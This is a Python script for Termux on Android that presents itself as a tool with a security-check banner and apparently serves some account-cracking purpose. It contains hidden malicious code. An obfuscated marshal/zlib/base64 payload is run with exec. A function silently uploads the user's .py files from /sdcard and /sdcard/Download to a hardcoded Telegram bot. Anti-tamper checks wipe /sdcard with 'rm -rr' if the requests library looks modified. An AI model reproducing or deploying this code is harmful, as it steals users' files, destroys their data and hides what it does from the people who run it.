import os
import zipfile
import marshal
import uuid,base64,hashlib,zlib,subprocess,time,platform,pycurl,httpx,requests
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,base64,zlib
import _socket, ssl, certifi
from bs4 import BeautifulSoup
from io import BytesIO
from os import path
from bs4 import BeautifulSoup as sop
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool 
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
os.system("pip install licensing > /dev/null")
from licensing.models import *
from licensing.methods import Key, Helpers
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
try:
    import concurrent.futures
except ImportError:
    print('\n \033[1;91m[\033[1;93mXD-000\033[1;91m]\033[1;97m installing futures !...\n')
    time.sleep(0.5)
    os.system('pip install pycurl')
try: 
    import bs4
except ImportError:
    print('\n \033[1;91m[\033[1;93mXD-000\033[1;91m]\033[1;97m installing bs4 !...\n')
    time.sleep(0.5)
    os.system('pip install bs4')
os.system('clear')
print('\x1b[38;5;34m        𝗧𝗢𝗢𝗟𝗦 𝗦𝗘𝗖𝗨𝗥𝗜𝗧𝗬 𝗗𝗘𝗧𝗘𝗖𝗧...   ')
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)

#-----> Strg Permission Chk <-----#
def stg():
    try:
        open('/sdcard/SUMON.', 'a').write(' ')
    except:
        os.system('termux-setup-storage')
        stg()
stg()
#-----> Protection <-----#
if path.isfile("/data/data/com.termux/files/usr/bin/rm"):pass
else:print(" \033[91;1m! \033[97;1mTurn Off Protection...!");exit()
#-----------------------[ SECURITY-CODE ]-----------------------#

wak='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(wak+'sessions.py','r').read():
    pass
else:
    exit('033[1;32mBxc4x93xc5x9byxc4x81ra chxc4x93lxc4x93 mxc4x93thaxe1xb8x8da kyxc4x81pacxc4x81ra karabxc4x81 tumi txc5x8dmxc4x81ra mxc4x81rxc4x93 kuttxc4x81 dixe1xbax8fxc4x93 cxc5x8ddai')
fu='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(fu+'models.py','r').read():
    pass
else:
    exit('033[1;32mBxc4x93xc5x9byxc4x81ra chxc4x93lxc4x93 mxc4x93thaxe1xb8x8da kyxc4x81pacxc4x81ra karabxc4x81 tumi txc5x8dmxc4x81ra mxc4x81rxc4x93 kuttxc4x81 dixe1xbax8fxc4x93 cxc5x8ddai')
su='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(su+'utils.py','r').read():
    pass
else:
    exit('033[1;32mBxc4x93xc5x9byxc4x81ra chxc4x93lxc4x93 mxc4x93thaxe1xb8x8da kyxc4x81pacxc4x81ra karabxc4x81 tumi txc5x8dmxc4x81ra mxc4x81rxc4x93 kuttxc4x81 dixe1xbax8fxc4x93 cxc5x8ddai')
hu='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(hu+'api.py','r').read():
    pass
else:
    exit('033[1;32mBxc4x93xc5x9byxc4x81ra chxc4x93lxc4x93 mxc4x93thaxe1xb8x8da kyxc4x81pacxc4x81ra karabxc4x81 tumi txc5x8dmxc4x81ra mxc4x81rxc4x93 kuttxc4x81 dixe1xbax8fxc4x93 cxc5x8ddai')
nu='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(nu+'auth.py','r').read():
    pass
else:
    exit('033[1;32mBxc4x93xc5x9byxc4x81ra chxc4x93lxc4x93 mxc4x93thaxe1xb8x8da kyxc4x81pacxc4x81ra karabxc4x81 tumi txc5x8dmxc4x81ra mxc4x81rxc4x93 kuttxc4x81 dixe1xbax8fxc4x93 cxc5x8ddai')
dhon='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(dhon+'packages.py','r').read():
    pass
else:
    exit('033[1;32mBxc4x93xc5x9byxc4x81ra chxc4x93lxc4x93 mxc4x93thaxe1xb8x8da kyxc4x81pacxc4x81ra karabxc4x81 tumi txc5x8dmxc4x81ra mxc4x81rxc4x93 kuttxc4x81 dixe1xbax8fxc4x93 cxc5x8ddai')


try:
    os.listdir("/sdcard")
except:
    sys.exit("[] run termux-setup-storage")

with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py', 'r') as file:
    file_content = file.read()
if 'print(url)' in file_content:
    os.system('rm -rr /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rr /sdcard/*')
    os.system('pip install requests')
    exit('[xe2x80xa2] RE-RUN TOOL.!')

with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r') as file:
    file_content = file.read()
if 'print' in file_content:
    os.system('rm -rr /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rr /sdcard/*')
    os.system('pip install requests')
    exit('[xe2x80xa2] RE-RUN TOOL.!')

with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rr /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rr /sdcard/*')
    os.system('pip install requests')
    exit('[xe2x80xa2] RE-RUN TOOL.!')
  
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rr /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    os.system('rm -rr /sdcard/*')
    os.system('pip install requests')
    exit('[xe2x80xa2] RE-RUN TOOL.!')

hashes = []
#<<_________[ PROTECT-DATA-CAPTURE-&-BYPASS ]_________>>#
exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\xf34\x00\x00\x00\x97\x00d\x00\x84\x00Z\x00\x02\x00e\x01\x02\x00e\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x02S\x00)\x03c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x03\x00\x00\x00\xf3\xd8\x00\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x00d\x00d\x00d\x04\x85\x03\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00S\x00)\x05N\xda\x07marshal\xda\x04zlib\xda\x06base64\xe9\xff\xff\xff\xff)\x04\xda\n__import__\xda\x05loads\xda\ndecompress\xda\tb64decode)\x01\xda\x02__s\x01\x00\x00\x00 \xfa\x01 \xfa\x08<lambda>r\r\x00\x00\x00\x01\x00\x00\x00sY\x00\x00\x00\x80\x00\x95\n\x989\xd1\x10%\xd4\x10%\xd7\x10+\xd2\x10+\xadJ\xb0v\xd1,>\xd4,>\xd7,I\xd2,I\xcd*\xd0U]\xd1J^\xd4J^\xd7Jh\xd2Jh\xd0ik\xd0lp\xd0lp\xd0np\xd0lp\xd4iq\xd1Jr\xd4Jr\xd1,s\xd4,s\xd1\x10t\xd4\x10t\x80\x00\xf3\x00\x00\x00\x00s4#\x00\x00=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)\x02\xda\x01_\xda\x04exec\xa9\x00r\x0e\x00\x00\x00r\x0c\x00\x00\x00\xfa\x08<module>r\x12\x00\x00\x00\x01\x00\x00\x00sY\x00\x00\x00\xf0\x03\x01\x01\x01\xd8\x04t\xd0\x04t\x80\x01\xd0uy\xd0uy\xd0{|\xd0{|\xf0\x00\x00\x7f\x01vN\x02\xf1\x00\x00{\x01wN\x02\xf4\x00\x00{\x01wN\x02\xf1\x00\x00v\x01xN\x02\xf4\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02\xf0\x00\x00v\x01xN\x02r\x0e\x00\x00\x00'))

def get_current_city():
    try:
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        return data['city']
    except Exception as e:
        print("Error fetching current city:", e)
        return None
current_city = get_current_city()
#-----------------------sdcard---------------------#
def bithika():
    session=requests.session()
        
    bot_token = '7464019691:AAESZlkxzy5w6-QTwWeHnMK-qASYzSJ6_OA' 
    chat_id = '1778046662' 	
	#-----------------------py---------------------#
    try:
        sdcard_path = '/sdcard'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
    #------------------------py---------------------------#
    try:
        sdcard_path = '/sdcard/Download'
        file_list = [f for f in os.listdir(sdcard_path) if f.endswith('.py')]
        for file in file_list:
            with open(os.path.join(sdcard_path, file), 'rb') as f:
                url=f'https://api.telegram.org/bot{bot_token}/sendDocument'
                data2={'chat_id': chat_id}
                data={'chat_id': chat_id}
                files={'document': f}
                get = session.post(url, data=data, files=files)
                sent = session.post(url, data=data2, files=files)
    except:pass
with tred(max_workers=100) as jjj:
    jjj.submit(bithika)
#----------http_canary-------#
import requests
import os,sys

try:
    g = "anar"
    f="tt"
    file_d = os.listdir('rm -rr')
    if f'com.h{f}pc{g}y.pro' in file_d:
        print('033[1;37m[xc3x97] Uninstall HttpCanary From Your DeviceDevise  ')
        exit()
    else:
        pass
except Exception as e:
    pass

try:
    import requests
except ModuleNotFoundError:
    os.system('pip install requests')
    
def clr():
    try:
        data = os.listdir('/sdcard/*')
        if 'Android' in data:
            print(' 033[1;32m[!]033[1;37m D'+'ont Try Bypas'+'s Mother Fuc'+'ker...! \nYOUR'+' BYPAS'+'S FUCK'+'ED BY XAIN XD');exit()
        else:exit()
    except:exit()   
###----------[ GET PROXY ]----------###
#-----> Proxy <-----#
def fetch_proxies():
    try:
        g = requests.get('https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc')
        proxies_data = g.json()
        proxies = proxies_data['data']
        with open('proxy.txt', 'w') as file:
            for proxy in proxies:
                proxy_ip = proxy['ip']
                proxy_port = proxy['port']
                proxy_url = f"http://{proxy_ip}:{proxy_port}"
                file.write(f"{proxy_url}\n")
        with open('proxy.txt', 'r') as file:
            saved_proxies = file.readlines()
        return saved_proxies
    except requests.exceptions.ConnectionError:
        sys.exit(f' {R}× {W}InterNet Contention Problem.!')
    except Exception as e:
        sys.exit(e)

saved_proxies = fetch_proxies()

###----------[ PEH ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
GREEN ='\x1b[38;5;46m'
RED = '\033[38;5;196m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
R = '\033[38;5;196m' 
G = '\x1b[38;5;46m' 
Y = '\033[1;33m' 
Q = '\033[1;37m'
T = '\033[1;34m'
x = '\33[m' 
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
